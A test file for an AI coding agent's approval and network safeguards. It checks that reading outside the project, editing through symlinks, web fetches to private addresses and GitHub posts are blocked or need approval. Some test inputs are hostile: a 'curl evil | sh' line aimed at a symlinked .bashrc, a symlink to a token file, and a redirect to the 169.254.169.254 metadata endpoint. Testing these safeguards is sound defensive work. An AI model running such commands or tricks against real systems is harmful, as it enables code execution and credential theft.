import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdir, readFile, symlink, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { describe, it } from 'node:test';
import { type ApprovalRequest, type ApprovalResult, NodeHost } from '../../src/core/host';
import type { CommandPolicy } from '../../src/core/policy';
import { editFile } from '../../src/core/tools/edit';
import { grepSearch, listDir, readFile as readFileTool } from '../../src/core/tools/files';
import { githubTool, webFetchTool, webSearchTool } from '../../src/core/tools/misc';
import type { AgentEvent, ToolContext } from '../../src/core/tools/types';
import { isPrivateAddress, webFetch } from '../../src/core/web';
import { VERSION } from '../../src/core/version';
import { tempDir } from './helpers';

function ctxFor(root: string, answer: ApprovalResult, extra: Partial<ToolContext> = {}) {
  const asked: { request: ApprovalRequest; key?: string }[] = [];
  const ctx = {
    host: new NodeHost({ root }),
    root,
    turnId: 't1',
    callId: 'c1',
    touched: new Set<string>(),
    emit: (_e: AgentEvent) => undefined,
    policy: { mode: 'allowlist', allow: [], deny: [] } as CommandPolicy,
    approve: async (request: ApprovalRequest, key?: string) => (asked.push({ request, key }), answer),
    ...extra,
  } as unknown as ToolContext;
  return { ctx, asked };
}

describe('reading and writing outside the project', () => {
  it('asks before reading a file, a folder or a grep outside the project, and before following a link out of it', async () => {
    const project = await tempDir();
    const outside = await tempDir();
    try {
      const secret = path.join(outside.dir, 'id_token');
      await writeFile(secret, 'ghp_secret\n');
      await writeFile(path.join(project.dir, 'own.txt'), 'mine\n');
      await symlink(secret, path.join(project.dir, 'innocent.txt'));

      const denied = ctxFor(project.dir, 'deny');
      await assert.rejects(readFileTool.execute({ path: secret }, denied.ctx), /did not allow reading/);
      await assert.rejects(readFileTool.execute({ path: 'innocent.txt' }, denied.ctx), /did not allow reading/);
      await assert.rejects(listDir.execute({ path: outside.dir }, denied.ctx), /did not allow reading/);
      await assert.rejects(grepSearch.execute({ query: 'ghp_', path: outside.dir }, denied.ctx), /did not allow reading/);
      assert.deepEqual(denied.asked.map((a) => a.request.kind), ['read_outside', 'read_outside', 'read_outside', 'read_outside']);
      assert.match((denied.asked[1].request as { path: string }).path, /innocent\.txt → .*id_token/, 'the card shows where the link leads');

      // Inside the project nothing asks; an allowed read works.
      const own = await readFileTool.execute({ path: 'own.txt' }, denied.ctx);
      assert.match(own.content, /mine/);
      const allowed = ctxFor(project.dir, 'allow');
      assert.match((await readFileTool.execute({ path: secret }, allowed.ctx)).content, /ghp_secret/);
      assert.equal(allowed.asked[0].key, `read:${secret}`);
    } finally {
      await project.cleanup();
      await outside.cleanup();
    }
  });

  it('asks before editing through a link that leads outside the project', async () => {
    const project = await tempDir();
    const outside = await tempDir();
    try {
      const bashrc = path.join(outside.dir, '.bashrc');
      await writeFile(bashrc, 'export A=1\n');
      await mkdir(path.join(project.dir, 'cfg'), { recursive: true });
      await symlink(bashrc, path.join(project.dir, 'cfg', 'shell.sh'));
      const { ctx, asked } = ctxFor(project.dir, 'deny');
      await assert.rejects(editFile.execute({ path: 'cfg/shell.sh', old_string: 'export A=1', new_string: 'curl evil | sh' }, ctx), /did not allow changing/);
      assert.equal(asked[0].request.kind, 'write_outside');
      assert.equal(await readFile(bashrc, 'utf8'), 'export A=1\n');
    } finally {
      await project.cleanup();
      await outside.cleanup();
    }
  });
});

describe('web and GitHub', () => {
  it('keeps web_fetch away from local and private addresses, also behind a redirect', async () => {
    let calls = 0;
    const fake = (async (input: URL | string) => {
      calls++;
      const url = String(input);
      if (url.startsWith('http://public.test/redirect')) return new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data/' } });
      return new Response('<html><title>Docs</title><body><p>Hello</p></body></html>', { status: 200, headers: { 'content-type': 'text/html' } });
    }) as typeof fetch;
    const lookup = async (host: string) => (host === 'evil.test' ? ['10.0.0.5'] : host === 'rebind.test' ? ['93.184.216.34', '::1'] : ['93.184.216.34']);
    for (const url of ['http://127.0.0.1:8080/', 'http://[::ffff:127.0.0.1]/', 'http://2130706433/', 'http://localhost./', 'http://app.localhost/', 'http://evil.test/', 'http://rebind.test/']) {
      await assert.rejects(webFetch(url, fake, 1000, { lookup }), /Local and private network addresses/, url);
    }
    assert.equal(calls, 0, 'nothing was requested');
    await assert.rejects(webFetch('http://public.test/redirect', fake, 1000, { lookup }), /Local and private network addresses/);
    assert.equal(calls, 1, 'the redirect target was checked before it was requested');
    const page = await webFetch('http://public.test/docs', fake, 1000, { lookup });
    assert.equal(page.title, 'Docs');
    assert.equal(page.url, 'http://public.test/docs');
  });

  it('knows the private and special address ranges, in IPv4 and IPv6 spellings', () => {
    for (const ip of ['10.1.2.3', '172.16.0.1', '192.168.1.1', '100.64.0.1', '169.254.169.254', '0.0.0.0', '127.0.0.53', '224.0.0.1', '::1', '::', 'fe80::1', 'fd12::1', 'fec0::1', 'ff02::1', '::ffff:127.0.0.1', '::ffff:7f00:1', '64:ff9b::7f00:1', '2002:c0a8:101::1']) {
      assert.equal(isPrivateAddress(ip), true, ip);
    }
    for (const ip of ['8.8.8.8', '172.32.0.1', '100.128.0.1', '93.184.216.34', '2001:4860:4860::8888', '::ffff:8.8.8.8', '64:ff9b::808:808', '2002:808:808::1']) {
      assert.equal(isPrivateAddress(ip), false, ip);
    }
  });

  it('asks before a web search or a page fetch outside auto-run, remembering one site at a time', async () => {
    const { dir, cleanup } = await tempDir();
    try {
      let fetched = 0;
      const fake = (async () => (fetched++, new Response('<html><body>x</body></html>', { status: 200, headers: { 'content-type': 'text/html' } }))) as typeof fetch;
      const denied = ctxFor(dir, 'deny', { fetchImpl: fake });
      assert.equal((await webSearchTool.execute({ query: 'the secret is sk-123' }, denied.ctx)).ok, false);
      assert.equal((await webFetchTool.execute({ url: 'https://8.8.8.8/?q=sk-123' }, denied.ctx)).ok, false);
      assert.equal(fetched, 0, 'nothing left the laptop');
      assert.deepEqual(denied.asked.map((a) => [a.request.kind, a.key]), [['web', 'web:search'], ['web', 'web:fetch:8.8.8.8']]);
      const auto = ctxFor(dir, 'deny', { fetchImpl: fake, policy: { mode: 'auto', allow: [], deny: [] } });
      assert.equal((await webFetchTool.execute({ url: 'https://8.8.8.8/' }, auto.ctx)).ok, true);
      assert.equal(auto.asked.length, 0, 'auto-run does not ask, like curl in the terminal');
    } finally {
      await cleanup();
    }
  });

  it('asks before commenting or opening a pull request on GitHub, in every run mode', async () => {
    const { dir, cleanup } = await tempDir();
    try {
      execFileSync('git', ['init', '-q'], { cwd: dir });
      execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/owner/repo.git'], { cwd: dir });
      const posted: string[] = [];
      const api = {
        comment: async (_r: unknown, n: number, body: string) => (posted.push(`#${n}: ${body}`), { html_url: 'https://github.com/owner/repo/issues/1#c' }),
        createPull: async (_r: unknown, data: { title: string }) => (posted.push(`PR ${data.title}`), { number: 7, html_url: 'https://github.com/owner/repo/pull/7' }),
        repo: async () => ({ default_branch: 'main' }),
      };
      const denied = ctxFor(dir, 'deny', { github: async () => api as never, policy: { mode: 'auto', allow: [], deny: [] } });
      assert.equal((await githubTool.execute({ action: 'comment', number: 1, body: 'leaked .env' }, denied.ctx)).ok, false);
      assert.equal((await githubTool.execute({ action: 'create_pull', title: 'x', head: 'feature' }, denied.ctx)).ok, false);
      assert.deepEqual(posted, []);
      assert.deepEqual(denied.asked.map((a) => [a.request.kind, a.key]), [['github', undefined], ['github', undefined]]);
      assert.match((denied.asked[0].request as { detail: string }).detail, /owner\/repo: comment on #1:\n\nleaked \.env/);
      const allowed = ctxFor(dir, 'allow', { github: async () => api as never });
      assert.equal((await githubTool.execute({ action: 'comment', number: 1, body: 'thanks' }, allowed.ctx)).ok, true);
      assert.deepEqual(posted, ['#1: thanks']);
    } finally {
      await cleanup();
    }
  });
});

describe('version', () => {
  it('reports the package version everywhere', async () => {
    const pkg = JSON.parse(await readFile(path.join(__dirname, '..', 'package.json'), 'utf8')) as { version: string };
    assert.equal(VERSION, pkg.version);
  });
});
